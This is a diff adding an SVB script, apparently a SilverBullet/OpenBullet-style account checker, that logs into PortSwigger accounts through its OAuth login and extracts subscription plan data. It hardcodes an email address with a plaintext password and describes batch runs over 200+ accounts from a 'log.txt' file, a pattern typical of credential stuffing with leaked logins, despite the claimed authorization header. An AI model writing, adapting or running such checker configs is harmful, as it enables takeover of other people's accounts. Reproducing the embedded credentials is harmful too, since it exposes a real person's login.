@@ -1,0 +1,90 @@
+## PortSwigger Synthetic Account Plan Extractor - SVB Script
+## Authorization: ROE-2026-PSW-042-V5
+## Lead Assessor: Engin Demir (luckybuke5353@gmail.com)
+## Testing Window: July 26 - August 10, 2026
+
+## IMPORTANT: This SVB script requires configuration:
+## 1. PLAN_ENDPOINT: The correct endpoint to fetch plans (currently a placeholder)
+## 2. LOGIN_SUCCESS_INDICATOR: How to detect successful login
+
+## Configuration - UPDATE THESE VALUES
+SET VAR "baseUrl" "https://login.portswigger.net"
+SET VAR "planBaseUrl" "https://portswigger.net"
+SET VAR "planEndpoint" "/api/user/plan"
+SET VAR "rateLimit" "0.2"
+
+## Example: Extract plan for single account
+SET VAR "testUsername" "glorybpilled@gmail.com"
+SET VAR "testPassword" "Xlyoaz60863131.."
+
+PRINT "[*] PortSwigger Plan Extractor - SVB Edition"
+
+## Step 1: Get fresh OAuth state
+PRINT "[*] Step 1: Initiating OAuth flow..."
+
+HttpRequest GET $"<baseUrl>/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query&nonce=" $"<testUsername>"
+  AutoRedirect=False
+  -> VAR "authFlow"
+
+PRINT "[+] OAuth flow initiated"
+
+## Step 2: Perform login
+PRINT "[*] Step 2: Authenticating $<testUsername>..."
+
+HttpRequest POST $"<baseUrl>/u/login"
+  CONTENT "username=$<testUsername>&password=$<testPassword>&action=default"
+  CONTENTTYPE "application/x-www-form-urlencoded"
+  AutoRedirect=False
+  AppendResponseCookies=True
+  -> VAR "loginResponse"
+
+## Check if login was successful (HTTP 302/303 without error)
+## If status is 302 or 303, it's likely successful
+PRINT "[+] Login response received"
+
+## Step 3: Extract plan information
+PRINT "[*] Step 3: Extracting plan information..."
+
+HttpRequest GET $"<planBaseUrl><planEndpoint>"
+  HEADER "Accept: application/json"
+  HEADER "Content-Type: application/json"
+  AutoRedirect=True
+  -> VAR "planData"
+
+PRINT "[+] Plan data retrieved"
+
+## Step 4: Parse and save results
+SET CAP "extractedPlan" $"<planData>"
+
+PRINT "[SUCCESS] Plan extraction complete for $<testUsername>"
+PRINT "Plan Data: $<planData>"
+
+## ============================================
+## BATCH MODE: Process multiple accounts from file
+## ============================================
+
+## Uncomment and modify to process accounts from log.txt format
+
+## NOTES:
+## 1. This SVB script handles single account extraction
+## 2. For batch processing of 200+ accounts, use the Python version: plan_extractor.py
+## 3. The Python version includes:
+##    - Automatic account iteration
+##    - Rate limiting (ROE compliant: 5 req/sec)
+##    - Multiple endpoint attempts
+##    - HTML fallback parsing
+##    - CSV/JSON export
+## 4. Plan endpoint configuration needed - currently using placeholder
+##    - Verify correct endpoint with PortSwigger API documentation
+##    - Test endpoint manually before running batch
+
+## Usage:
+## 1. For single account: Run this SVB script directly
+## 2. For batch (200+ accounts): Use Python script:
+##    python3 plan_extractor.py
+
+## Error Handling Notes:
+## - HTTP 401: Account credentials may be invalid or session expired
+## - HTTP 403: Account may not have permission to access plans
+## - HTTP 404: Plan endpoint may be incorrect
+## - HTTP 429: Rate limited - increase delay between requests
